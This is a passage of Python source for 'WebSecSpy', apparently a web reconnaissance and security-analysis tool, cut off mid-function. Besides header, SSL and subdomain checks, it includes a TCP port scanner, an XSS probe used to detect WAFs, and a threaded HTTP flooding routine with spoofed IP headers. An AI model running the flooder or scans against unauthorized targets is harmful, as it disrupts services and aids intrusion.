import random
import signal
import socket
import requests
import argparse
import sys
import logging
import time
import os
import ssl
import pprint 
import threading
import sublist3r
import io
import re
import concurrent.futures
from tqdm import tqdm
from urllib.parse import urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Back, Style, init
from cryptography.x509 import load_pem_x509_certificate
from cryptography.hazmat.backends import default_backend
from cryptography import x509
from requests.exceptions import RequestException
from urllib.parse import urlparse, parse_qs, urlencode

# Initialize colorama
init(autoreset=True)

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(message)s')

# Function to display a random banner
def display_random_banner():
    banners = [
        r"""
	 __          __  _     _____            _____             
	 \ \        / / | |   / ____|          / ____|            
	  \ \  /\  / /__| |__| (___   ___  ___| (___  _ __  _   _ 
	   \ \/  \/ / _ \ '_ \\___ \ / _ \/ __|\___ \| '_ \| | | |
	    \  /\  /  __/ |_) |___) |  __/ (__ ____) | |_) | |_| |
	     \/  \/ \___|_.__/_____/ \___|\___|_____/| .__/ \__, |
 	                                            | |     __/ |
 	                                            |_|    |___/ 
        """,
        r"""
        
	██╗    ██╗███████╗██████╗ ███████╗███████╗ ██████╗███████╗██████╗ ██╗   ██╗
	██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝
	██║ █╗ ██║█████╗  ██████╔╝███████╗█████╗  ██║     ███████╗██████╔╝ ╚████╔╝ 
	██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══╝  ██║     ╚════██║██╔═══╝   ╚██╔╝  
	╚███╔███╔╝███████╗██████╔╝███████║███████╗╚██████╗███████║██║        ██║   
	 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚══════╝╚═╝        ╚═╝   
                                                         
        """,
        r"""
	 __      __      ___.     _________               _________             
	/  \    /  \ ____\_ |__  /   _____/ ____   ____  /   _____/_____ ___.__.
	\   \/\/   // __ \| __ \ \_____  \_/ __ \_/ ___\ \_____  \\____ <   |  |
	 \        /\  ___/| \_\ \/        \  ___/\  \___ /        \  |_> >___  |
 	 \__/\  /  \___  >___  /_______  /\___  >\___  >_______  /   __// ____|
 	      \/       \/    \/        \/     \/     \/        \/|__|   \/     
        """,
        r"""
	'||      ||`        '||     .|'''|               .|'''|                   
	 ||      ||          ||     ||                   ||                       
	 ||  /\  ||  .|''|,  ||''|, `|'''|, .|''|, .|'', `|'''|, '||''|, '||  ||` 
	  \\//\\//   ||..||  ||  ||  .   || ||..|| ||     .   ||  ||  ||  `|..||  
	   \/  \/    `|...  .||..|'  |...|' `|...  `|..'  |...|'  ||..|'      ||  
	                                                          ||       ,  |'  
 	                                                         .||        ''    
        """,
        r"""
	 █     █░▓█████  ▄▄▄▄     ██████ ▓█████  ▄████▄    ██████  ██▓███ ▓██   ██▓
	▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  ▒██    ▒ ▓██░  ██▒▒██  ██▒
	▒█░ █ ░█ ▒███   ▒██▒ ▄██░ ▓██▄   ▒███   ▒▓█    ▄ ░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
	░█░ █ ░█ ▒▓█  ▄ ▒██░█▀    ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
	░░██▒██▓ ░▒████▒░▓█  ▀█▓▒██████▒▒░▒████▒▒ ▓███▀ ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
	░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
	  ▒ ░ ░   ░ ░  ░▒░▒   ░ ░ ░▒  ░ ░ ░ ░  ░  ░  ▒   ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
	      ░     ░    ░    ░ ░  ░  ░     ░   ░        ░  ░  ░  ░░       ▒ ▒ ░░  
	                 ░            ░     ░   ░              ░           ░ ░     
	                                                                   ░                     
        """
    ]
    
    # Define random colors for the banner
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
    
    # Clear the console before displaying the banner
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Choose a random banner and color
    banner = random.choice(banners)
    color = random.choice(colors)
    
    # Display banner line by line with a delay
    for line in banner.splitlines():
        logging.info(color + line)
        time.sleep(0.25)  # 0.25s delay between each line
    
    # Display program information after the banner
    logging.info(Fore.WHITE + "                  	#######################################")
    logging.info(Fore.WHITE + "                  	#          WebSecSpy v1.0             #")
    logging.info(Fore.WHITE + "                   	 #  Web Recon & Security Analyzer    #")
    logging.info(Fore.WHITE + "                  	#          Developed by [0xFranG]      #")
    logging.info(Fore.WHITE + "                  	#######################################")
    logging.info(Fore.WHITE + "                  	linkedIn: francisco-g-48309821a")
    logging.info(Fore.WHITE + "                  	IG: @CyberwithFran\n")
    logging.info(Fore.WHITE + "                  	Example usage:")
    logging.info(Fore.WHITE + "                  	python WebSecS.py -U http(s)://www.example.com [options]")
    logging.info(Fore.WHITE + "                  	python WebSecS.py -f urls.txt [options]")
    logging.info(Fore.WHITE + "                  	----------------------------------------\n")

# Function to clear the console and display an exit message
def cleanup():
    # Clear the console
    os.system('cls' if os.name == 'nt' else 'clear')
    # Display exit message
    logging.info(Fore.WHITE + "\nExiting... HAPPY HACKING!\n")

# Signal handler for interruption (Ctrl+C)
def signal_handler(sig, frame):
    cleanup()
    sys.exit(0)

# Register the signal handler for interruption
signal.signal(signal.SIGINT, signal_handler)

# Function to ensure URL has a scheme
def ensure_scheme(url):
    if not urlparse(url).scheme:
        url = 'http://' + url  # Add http:// if no scheme is present
    return url

# Function to get the IP address of a URL using socket
def get_ip_from_url(url):
    try:
        parsed = urlparse(url)
        domain = parsed.netloc or parsed.path  # handle malformed URLs

        if domain.startswith('www.'):
            domain = domain[4:]

        ip_list = socket.gethostbyname_ex(domain)
        if len(ip_list) > 2 and ip_list[2]:
            return ip_list[2][0]
        return ip_list[2][0] if ip_list else "IP not found"
    except Exception:
        return "IP not found"


# Function to check the HTTP status of a URL and measure response time
def check_url_status(url, proxy=None, verify_ssl=True):
    url = ensure_scheme(url)
    start_time = time.time()

    proxies = {"http": proxy, "https": proxy} if proxy else {}

    try:
        # Attempt with SSL verification
        response = requests.get(url, proxies=proxies, timeout=10, allow_redirects=True, verify=verify_ssl)
        response_time = time.time() - start_time
        return response.status_code, response_time, response.headers

    except requests.exceptions.SSLError:
        if verify_ssl:
            # Retry without SSL verification if SSL failed
            return check_url_status(url, proxy, verify_ssl=False)
        return None, None, None

    except requests.exceptions.RequestException:
        return None, None, None


# Function to check if a URL uses HTTPS and verify SSL certificate and protocol version

def check_ssl(url):
    parsed = urlparse(url)
    if parsed.scheme != "https":
        return None, None, None

    try:
        # Get the server's certificate using ssl.get_server_certificate
        cert = ssl.get_server_certificate((parsed.hostname, 443))
        
        # Convert the certificate to a dictionary using OpenSSL
        cert = load_pem_x509_certificate(cert.encode(), default_backend())

        # Certificate information
        issuer = cert.issuer
        subject = cert.subject
        not_after = cert.not_valid_after_utc  # Use not_valid_after_utc to get the correct expiration date
        san = cert.extensions.get_extension_for_oid(x509.oid.ExtensionOID.SUBJECT_ALTERNATIVE_NAME).value

        # Extract the Common Name (CN) from issuer and subject
        issuer_name = issuer.get_attributes_for_oid(x509.NameOID.COMMON_NAME)[0].value
        subject_name = subject.get_attributes_for_oid(x509.NameOID.COMMON_NAME)[0].value

        # Format the expiration date
        expiration_date = not_after.strftime("%Y-%m-%d %H:%M:%S")

        # Get Subject Alternative Names (SAN)
        sans = ", ".join([str(dns) for dns in san])

        # Determine the SSL/TLS version
        context = ssl.create_default_context()
        with context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=parsed.hostname) as s:
            s.connect((parsed.hostname, 443))
            ssl_version = s.version()

        # Set the result color based on the TLS version
        ssl_color = {
            'TLSv1': Fore.RED,
            'TLSv1.1': Fore.RED,
            'TLSv1.2': Fore.YELLOW,
            'TLSv1.3': Fore.GREEN
        }.get(ssl_version, Fore.MAGENTA)

        # Format the certificate information
        cert_info = (
            f"{Fore.CYAN}[+]{Fore.YELLOW} SSL Certificate Info:\n"
            f"  Issued By       : {issuer_name}\n"
            f"  Subject         : {subject_name}\n"
            f"  Expiration Date : {expiration_date}\n"
            f"  SubjectAltNames : {sans}\n"
        )

        return f"SSL/TLS Version: {ssl_version}", ssl_color, cert_info

    except ssl.SSLError as e:
        return (
            f"SSL Error: {e}. This error suggests that the audited system may be missing the required "
            f"CA certificates to verify the SSL certificate chain. Check if the server is correctly configured "
            f"with all necessary intermediate certificates.",
            Fore.RED, None
        )

    except Exception as e:
        return (
            f"SSL Exception: {e}. This could indicate an issue with the server's SSL configuration or an "
            f"error in retrieving the certificate. It is possible that the audited system does not have the required "
            f"CA certificates installed.",
            Fore.RED, None
        )


import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def check_headers(url, proxy=None):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else {}
        response = requests.get(url, proxies=proxies, timeout=10, verify=False)
        headers = response.headers

        logging.info(Fore.MAGENTA + "\n[HEADERS DETECTED]")
        for header, value in headers.items():
            logging.info(f"{Fore.CYAN}{header}: {Fore.WHITE}{value}")

        # Required security headers and their purposes
        required_headers = {
            'Strict-Transport-Security': "Protects against downgrade attacks and cookie hijacking.",
            'Content-Security-Policy': "Prevents XSS and code injection.",
            'X-Frame-Options': "Protects against clickjacking.",
            'X-Content-Type-Options': "Prevents MIME-type sniffing.",
            'Referrer-Policy': "Controls how much referrer info is shared.",
            'Permissions-Policy': "Restricts browser features."
        }

        missing_headers = []
        misconfigured_headers = []

        for header, desc in required_headers.items():
            if header not in headers:
                missing_headers.append((header, desc))
            else:
                value = headers[header].lower()
                if header == 'Strict-Transport-Security' and "max-age=" not in value:
                    misconfigured_headers.append((header, "Missing 'max-age' directive."))
                elif header == 'Content-Security-Policy' and "default-src" not in value:
                    misconfigured_headers.append((header, "Missing 'default-src' directive."))

        # Fingerprinting detection
        fingerprinting_headers = {
            'Server': "Reveals backend software (e.g. Apache, nginx).",
            'X-Powered-By': "Reveals backend framework (e.g. PHP, ASP.NET).",
            'X-AspNet-Version': "Reveals ASP.NET version."
        }
        detected_fingerprints = [(h, fingerprinting_headers[h]) for h in fingerprinting_headers if h in headers]

        if missing_headers:
            logging.info(Fore.RED + "\n[MISSING SECURITY HEADERS]")
            for h, reason in missing_headers:
                logging.info(f"{Fore.RED}- {h}: {reason}")

        if misconfigured_headers:
            logging.info(Fore.YELLOW + "\n[MISCONFIGURED SECURITY HEADERS]")
            for h, issue in misconfigured_headers:
                logging.info(f"{Fore.YELLOW}- {h}: {issue}")

        if detected_fingerprints:
            logging.info(Fore.YELLOW + "\n[FINGERPRINTING HEADERS DETECTED]")
            for h, reason in detected_fingerprints:
                logging.info(f"{Fore.YELLOW}- {h}: ⚠️ {reason}")

        if not (missing_headers or misconfigured_headers or detected_fingerprints):
            logging.info(Fore.GREEN + "\n✔️ All critical security headers are present and well configured.")

        logging.info(Fore.MAGENTA + "\n[--- END HEADERS ANALYSIS ---]\n")

    except requests.exceptions.RequestException as e:
        logging.error(Fore.RED + f"[!] Error retrieving headers from {url}: {e}")



# Function to scan ports on a given IP address
def scan_ports(ip):
    open_ports = []
    
    # Ports to scan with their associated services
    port_services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 
        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 8080: "HTTP", 
        8888: "HTTP", 3306: "MySQL", 3389: "RDP", 5900: "VNC", 
        6379: "Redis", 6660: "IRC", 6661: "IRC", 6662: "IRC", 6663: "IRC", 
        8000: "HTTP", 554: "RTSP", 1723: "PPTP"
    }

    # Detect if the IP is IPv6 or IPv4
    try:
        # Check if IP is IPv6 by attempting to create an IPv6 socket
        socket.inet_pton(socket.AF_INET6, ip)
        is_ipv6 = True
    except socket.error:
        is_ipv6 = False
    
    # Scan each port
    for port, service in port_services.items():
        try:
            if is_ipv6:
                sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))  # Try connecting to the port
            if result == 0:
                open_ports.append(f"{port}/{service}: {Fore.MAGENTA} ACTIVE")
            else:
                open_ports.append(f"{port}/{service}: {Fore.RED} Closed/Filtered")
            sock.close()
        except socket.error:
            open_ports.append(f"{port}/{service}: {Fore.RED} Error")
            continue

    return open_ports



# DOS attack simulation

def simulate_dos(url, proxy=None, level=1):
    confirmation = input(
        f"{Fore.YELLOW}[!] WARNING: This will simulate a high-load test (DoS-like) against: {url}\n"
        f"{Fore.RED}[*] Proceeding without authorization may be ILLEGAL.\n"
        f"{Fore.CYAN}\n[?] Are you sure you want to continue? [y/N]: {Style.RESET_ALL}"
    ).strip().lower()

    if confirmation not in ["y", "yes"]:
        print(f"{Fore.LIGHTBLACK_EX}[-] Operation cancelled by user.{Style.RESET_ALL}\n")
        return

    intensity_config = {
        1: {"max_requests": 500, "timeout": 5, "threads": 50, "duration": 30},
        2: {"max_requests": 1000, "timeout": 10, "threads": 100, "duration": 60},
        3: {"max_requests": 5000, "timeout": 15, "threads": 200, "duration": 90},
    }


    # Intensity level
    cfg = intensity_config.get(level, intensity_config[1])
    max_requests = cfg["max_requests"]
    timeout = cfg["timeout"]
    threads = cfg["threads"]
    duration = cfg["duration"]

    print(f"\n{Fore.RED}[+] Simulating DoS attack (Level {level}) -> {Fore.MAGENTA}{url}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Requests: {max_requests}, Threads: {threads}, Timeout: {timeout}, Duration: {duration} seconds{Style.RESET_ALL}")

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "curl/7.68.0",
        "python-requests/2.25.1",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Wget/1.20.3 (linux-gnu)",
        "Bot/1.0 (http://example.com/bot)"
    ]

    fake_headers = lambda: {
        "User-Agent": random.choice(user_agents),
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "X-Forwarded-For": f"192.168.{random.randint(0,255)}.{random.randint(0,255)}",
        "X-Real-IP": f"192.168.{random.randint(0,255)}.{random.randint(0,255)}",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Language": "en-US,en;q=0.9",
        "X-Requested-With": "XMLHttpRequest",
        "X-DoS-Attack": "True"
    }

    def send_request(i):
        try:
            proxies = {"http": proxy, "https": proxy} if proxy else None
            headers = fake_headers()
            start = time.time()
            response = requests.get(url, headers=headers, proxies=proxies, timeout=timeout)
            end = time.time()
            duration = end - start

            print(
                f"{Fore.BLUE}[#{i+1}] {Fore.WHITE}Status: {Fore.CYAN}{response.status_code} "
                f"{Fore.WHITE}- Time: {Fore.YELLOW}{duration:.2f}s "
                f"{Fore.WHITE}- UA: {Fore.LIGHTBLACK_EX}{headers['User-Agent']}{Style.RESET_ALL}"
            )

            return {"status": response.status_code, "time": duration}
        except requests.exceptions.RequestException as e:
            print(
                f"{Fore.RED}[#{i+1}] FAILED - {str(e)}{Style.RESET_ALL}"
            )
            return {"status": None, "time": None}

    # Latency 
    baseline_samples = []
    for i in range(5):
        r = send_request(i)
        if r["time"]:
            baseline_samples.append(r["time"])
        time.sleep(0.3)

    baseline_latency = sum(baseline_samples) / len(baseline_samples) if baseline_samples else 0.5

    start_time = time.time()

    # Execution
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        results = list(executor.map(send_request, range(max_requests)))

    end_time = time.time()

    timeouts = sum(1 for r in results if r["status"] is None)
    server_errors = sum(1 for r in results if r["status"] in [502, 503, 504])
    success = sum(1 for r in results if r["status"] and r["status"] < 500)
    avg_time = sum(r["time"] for r in results if r["time"]) / (success if success else 1)
    total_time = end_time - start_time
    failed = max_requests - success
    final_chunk = results[-100:]
    still_down = sum(1 for r in final_chunk if r["status"] is None or r["status"] in [502, 503, 504])

    print(f"{Fore.CYAN}[*] Baseline latency: {Fore.YELLOW}{baseline_latency:.2f} seconds{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Timeouts: {Fore.YELLOW}{timeouts}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Server errors: {Fore.YELLOW}{server_errors}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Avg response time: {Fore.YELLOW}{avg_time:.2f} seconds{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Successful responses: {Fore.YELLOW}{success}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Failed responses: {Fore.YELLOW}{failed}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Total duration: {Fore.YELLOW}{total_time:.2f} seconds{Style.RESET_ALL}")

    # Vuln analysis
    reasons = []
    if timeouts > max_requests * 0.3:
        reasons.append(f"High number of timeouts: {timeouts}")
    if server_errors > max_requests * 0.3:
        reasons.append(f"Excessive 502/503/504 server errors: {server_errors}")
    if avg_time > baseline_latency * 3:
        reasons.append(f"Response time increased significantly from baseline ({avg_time:.2f}s > {baseline_latency:.2f}s)")
    if still_down > 80:
        reasons.append(f"Server did not recover in last 100 requests ({still_down}/100 still failing)")
    if failed > max_requests * 0.5:
        reasons.append(f"Too many failed responses: {failed}")

    if reasons:
        print(f"{Fore.RED}[+] LIKELY VULNERABLE!{Style.RESET_ALL}")
        print(f"\n{Fore.RED}[!] Reason(s):{Style.RESET_ALL}")
        for r in reasons:
            print(f"  - {r}")
    else:
        print(f"{Fore.LIGHTBLACK_EX}[-] Target is NOT vulnerable under current load.{Style.RESET_ALL}\n")



# Function to check a list of URLs from a file
def check_urls_from_file(filename, proxy=None, check_ssl_flag=False, check_headers_flag=False,
                         scan_ports_flag=False, enumerate_subdomains_flag=False,
                         detect_waf_flag=False, find_login_flag=False,
                         injection_flag=None, dos_check_flag=False, dos_level=None
                         ):
    with open(filename, 'r') as file:
        urls = file.readlines()

    for url in urls:
        url = url.strip()
        url = ensure_scheme(url)

        # If DoS check is enabled, simulate the DoS attack on the URL with the selected level
        if dos_check_flag and dos_level:
            print(f"[+] Simulating DoS attack -> {url} with intensity {dos_level}")
            simulate_dos(url, proxy, level=dos_level)
            continue  # Skip the other checks for this URL

        status_code, response_time, headers = check_url_status(url, proxy)
        ip = get_ip_from_url(url)
        ssl_version, ssl_color, cert_info = (None, None, None)

        if status_code and check_ssl_flag:
            ssl_version, ssl_color, cert_info = check_ssl(url)

        status_message = get_status_message(status_code) if status_code else "Unavailable"
        status_color = get_status_color(status_code) if status_code else Fore.RED

        if status_code == 200:
            logging.info(f"{url:<50} -IP:  {ip:<15} - {status_color}{status_message} ({status_code})")
        elif status_code:
            logging.info(f"{url:<50} -IP:  {ip:<15} - {status_color}{status_message} ({status_code})")
        else:
            logging.info(f"{url:<50} -IP:  {ip:<15} - {status_color}Unavailable")

        if ssl_version:
            logging.info(f"SSL: {ssl_color}{ssl_version}")
        if cert_info:
            print(cert_info)

        if check_headers_flag and headers:
            check_headers(url, proxy)

        if scan_ports_flag:
            open_ports = scan_ports(ip)
            logging.info("\n[----------------PORTS SCAN RESULTS----------------]")
            logging.info("[PORTS]")
            for port_info in open_ports:
                logging.info(port_info)
            logging.info("[------------------------END------------------------]\n")

        if enumerate_subdomains_flag:
            parsed_url = urlparse(url)
            domain = parsed_url.netloc or parsed_url.path
            domain = domain.replace("www.", "")

            logging.info(Fore.MAGENTA + "\nScanning for subdomains...\n")
            subdomains = enumerate_subdomains(domain)

            logging.info("[SUBDOMAINS]")
            if subdomains:
                for sub in subdomains:
                    logging.info(Fore.CYAN + f" - {sub}")
            else:
                logging.info(Fore.RED + "No subdomains found.")
            logging.info("[END]\n")

        if detect_waf_flag:
            detect_waf(url)

        if find_login_flag:
            detect_login_pages(url)
            

        if injection_flag:
            print(f"{Fore.BLUE}{'='*60}{Fore.RESET}")
            print(f"{Fore.GREEN}[+] SCANNING INJECTION ON: {url}{Fore.RESET}")
            print(f"{Fore.BLUE}{'='*60}{Fore.RESET}")
            test_injection_vulnerabilities(url, level=injection_flag)

            
           
# Function to get the status message corresponding to an HTTP status code
def get_status_message(status_code):
    messages = {
        200: "OK",
        201: "Created",
        202: "Accepted",
        204: "No Content",
        301: "Moved Permanently",
        302: "Found (Redirect)",
        400: "Bad Request",
        401: "Unauthorized",
        403: "Forbidden",
        404: "Not Found",
        405: "Method Not Allowed",
        408: "Request Timeout",
        429: "Too Many Requests",
        500: "Internal Server Error",
        501: "Not Implemented",
        502: "Bad Gateway",
        503: "Service Unavailable",
        504: "Gateway Timeout"
    }
    return messages.get(status_code, "Unknown")

def get_status_color(status_code):
    if status_code in [200, 201, 202, 204]:
        return Fore.CYAN
    elif status_code in [301, 302]:
        return Fore.YELLOW
    elif status_code in [400, 401, 403, 404, 405, 408, 429]:
        return Fore.RED
    elif status_code in [500, 501, 502, 503, 504]:
        return Fore.MAGENTA
    return Fore.WHITE



#Subdomain Lister
def enumerate_subdomains(domain):
    try:

        original_stderr = sys.stderr
        sys.stderr = io.StringIO()

        subdomains = sublist3r.main(
            domain,
            40,
            savefile=None,
            ports=None,
            silent=True,
            verbose=False,
            enable_bruteforce=False,
            engines=None
        )

        sys.stderr = original_stderr

        print(f"\n[SUBDOMAINS]\n")

        # Counters
        total = len(subdomains)
        with_ip = 0
        accessible = 0
        inaccessible = 0
        failed = 0

        for sub in subdomains:
            ip = "-"
            colored_ip = ""
            status_code = "-"
            colored_status = ""

            try:
                ip = socket.gethostbyname(sub)
                colored_ip = f"{Fore.MAGENTA}{ip}{Style.RESET_ALL}"
                with_ip += 1
            except socket.gaierror:
                ip = "No-IP"
                colored_ip = f"{Fore.RED}No-IP{Style.RESET_ALL}"
                failed += 1 

            success = False
            for scheme in ['https://', 'http://']:
                try:
                    url = scheme + sub
                    response = requests.get(url, timeout=5, verify=False)
                    status_code = response.status_code
                    if 200 <= status_code < 400:
                        colored_status = f"{Fore.CYAN}{status_code}{Style.RESET_ALL}"
                        accessible += 1
                    else:
                        colored_status = f"{Fore.RED}{status_code}{Style.RESET_ALL}"
                        inaccessible += 1
                    success = True
                    break
                except RequestException:
                    continue

            if not success:
                if ip != "No-IP":
                    colored_status = f"{Fore.YELLOW}-ERROR-{Style.RESET_ALL}"
                    failed += 1
                else:
                    colored_status = f"{Fore.YELLOW}-ERROR-{Style.RESET_ALL}"

            print(f" - {sub.ljust(35)} - IP: {colored_ip.ljust(25)} Code: {colored_status}")

        # Resumen
        print(f"\n{Fore.GREEN}[SUMMARY]{Style.RESET_ALL}")
        print(f" Total subdomains     : {total}")
        print(f" With IP              : {with_ip}")
        print(f" Accessible (200–399) : {Fore.CYAN}{accessible}{Style.RESET_ALL}")
        print(f" Inaccessible (400+)  : {Fore.RED}{inaccessible}{Style.RESET_ALL}")
        print(f" Failed or No-IP      : {Fore.YELLOW}{failed}{Style.RESET_ALL}\n")

        return subdomains

    except Exception:
        sys.stderr = original_stderr
        return []



def detect_waf(url):
    import requests
    from urllib.parse import urljoin
    from colorama import Fore
    import re

    print(f"{Fore.MAGENTA}[ WAF ANALYZER ]")
    print(f"{Fore.YELLOW}[+] Detecting possible WAF on {url}...{Fore.RESET}")

    waf_signatures = {
        "Cloudflare": ["cloudflare", "cf-ray", "cf-cache-status", "__cfduid", "cf-chl-bypass", "server: cloudflare"],
        "Sucuri": ["sucuri", "x-sucuri", "sucuri-cloudproxy"],
        "AWS WAF": ["awselb", "aws", "x-amzn", "x-amz-cf-id", "x-amzn-requestid"],
        "Akamai": ["akamai", "akamai-bot", "akamai-ghost", "akamai-x-cache"],
        "Imperva / Incapsula": ["incapsula", "x-iinfo", "visid_incap", "incap_ses", "incap_cookie"],
        "F5 BIG-IP": ["x-waf", "x-f5", "x-bigip", "bigipserver", "f5avr", "f5-sticky"],
        "Barracuda": ["barracuda", "barra-counter", "barracuda-waf", "barra-cookie"],
        "Radware": ["radware", "x-rdwr", "rdwr"],
        "Fortinet": ["fortiwaf", "fortiguard", "x-waf-status", "fortiproxy"],
        "DenyAll": ["denyall", "sessioncookie=denyall"],
        "DDoS-Guard": ["ddos-guard", "ddos-guard.net", "__ddg_"],
        "Citrix NetScaler": ["citrix", "netscaler", "CITRIX_NS_ID", "ns_af", "citrixadc"],
        "StackPath": ["stackpath", "sprequestguid", "x-cdn"],
        "360 Web Application Firewall": ["x-360waf", "360wzws", "wangzhan.360.cn"],
        "URLScan": ["urlscan", "x-urlscan"],
        "Yunjiasu": ["yunjiasu", "yunjiasu-nginx"],
        "SafeDog": ["safedog", "wzws-rid", "wzws-session", "safedogsite"],
        "Blueliv": ["blueliv"],
        "IBM WAF": ["ibm", "x-ibm-waf", "ibm_webseal"],
        "NSFocus": ["nsfocus", "nsfocuswaf"],
        "WatchGuard": ["watchguard", "x-watchguard"],
        "Azure Front Door": ["azure", "x-azure-ref", "x-msedge-ref"],
        "AppTrana": ["apptrana", "x-axiom-waf"],
        "Reblaze": ["reblaze", "rbzid", "rbz_hash"],
        "StackRox": ["stackrox"],
        "NAXSI": ["naxsi", "naxsi_sig"],
        "Wallarm": ["wallarm"],
        "PerimeterX": ["perimeterx", "px-wid", "pxvid", "px-auth"],
        "Fastly": ["fastly", "x-served-by", "x-cache"],
        "SecuPress": ["secuPress"],
        "ModSecurity": ["mod_security", "modsecurity", "modsec"],
        "WebKnight": ["webknight", "response generated by webknight"],
        "Jiasule": ["jiasule", "jsluid", "jsl_tracking"],
        "BitNinja": ["bitninja"],
        "DOSarrest": ["dosarrest", "dosarrestinternetsecurity"],
        "OpenResty": ["openresty", "resty-waf"],
        "Cdn-Secure": ["cdn-secure"],
        "BeeThink": ["beethink"],
        "Profense": ["profense"],
        "Armor Defense": ["armor"],
        "Mission Control": ["missioncontrol"],
        "AdNovum": ["nevisproxy"],
        "Generic": ["access denied", "request blocked", "website protection", "you have been blocked", "firewall detected"]
    }

    try:
        payload = "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
        test_url = urljoin(url, payload)

        response = requests.get(test_url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept": "*/*",
            "Referer": "https://google.com",
            "X-Forwarded-For": "1.3.3.7",
        }, timeout=10)

        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        cookies = [f"{c.name.lower()}={c.value.lower()}" for c in response.cookies]
        body = response.text.lower()

        detected = set()

        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                sig_l = sig.lower()
                if any(sig_l in h or sig_l in v for h, v in headers.items()) or \
                   any(sig_l in cookie for cookie in cookies) or \
                   sig_l in body:
                    detected.add(waf_name)
                    break

        suspicious_codes = {
            406: "Not Acceptable (often used by WAFs)",
            501: "Not Implemented (unexpected, may be filtered)",
            999: "Non-standard (e.g., WebKnight, IBM)",
            403: "Forbidden (may indicate filtering)",
            429: "Too Many Requests (rate-limiting)",
        }

        if response.status_code in suspicious_codes:
            print(f"{Fore.RED}[!] Suspicious HTTP status code: {response.status_code} ({suspicious_codes[response.status_code]}){Fore.RESET}")

        if 300 <= response.status_code < 400:
            location = response.headers.get("location", "")
            if "blocked" in location or "denied" in location:
                print(f"{Fore.RED}[!] Suspicious redirect to: {location}{Fore.RESET}")
                detected.add("Generic")

        if response.elapsed.total_seconds() > 5:
            print(f"{Fore.YELLOW}[!] High response time ({response.elapsed.total_seconds():.2f}s) — Possible WAF challenge or rate-limiting{Fore.RESET}")

        if detected:
            print(f"{Fore.RED}[!] WAF Detected: {', '.join(sorted(detected))}{Fore.RESET}")
            for waf in sorted(detected):
                print(f"{Fore.YELLOW}[i] {waf} - Version not disclosed{Fore.RESET}")
            print()
        else:
            print(f"{Fore.GREEN}[-] No WAF signatures detected.{Fore.RESET}\n")

    except Exception as e:
        print(f"{Fore.RED}[!] Error while detecting WAF: {e}{Fore.RESET}\n")





# Detect login/admin pages
def detect_login_pages(url):
    print(f"{Fore.MAGENTA}[ LOGIN PAGES DETECTOR ]")	
    print(f"{Fore.YELLOW}[+] Searching for login/admin pages on {url}...{Fore.RESET}")
    
    common_paths = [
        # Generic
        "admin", "login", "administrator", "user/login", "auth", "auth/login",
        "dashboard", "admin/login", "admin-panel", "controlpanel", "cpanel",
        "backend", "secure", "signin", "members", "account", "accounts",
        "adminarea", "admin_area", "adminconsole", "console", "access",
        
        # WordPress
        "wp-admin", "wp-login.php", "wordpress/wp-login.php", "blog/wp-login.php",

        # Joomla
        "administrator/index.php", "joomla/administrator",

        # Drupal
        "user", "user/login", "drupal/login",

        # phpMyAdmin
        "phpmyadmin", "phpmyadmin/index.php", "dbadmin",

        # Laravel
        "admin/auth/login", "laravel/login", "admin/login",

        # Otros CMS o frameworks
        "typo3", "umbraco", "siteadmin", "cms", "panel", "manager", "adminpanel",
        "control", "adminsite", "portal", "member", "staff", "admin_console"
    ]

    try:
        baseline = requests.get(urljoin(url, "/thispagedoesnotexist123"), timeout=5)
        baseline_len = len(baseline.text)
        baseline_title = extract_title(baseline.text)
    except:
        baseline_len = 0
        baseline_title = ""

    found = []

    for path in common_paths:
        test_url = urljoin(url, path)
        try:
            res = requests.get(test_url, timeout=5, allow_redirects=True)
            content = res.text.lower()
            title = extract_title(res.text)

            if (
                res.status_code in [200, 301, 302]
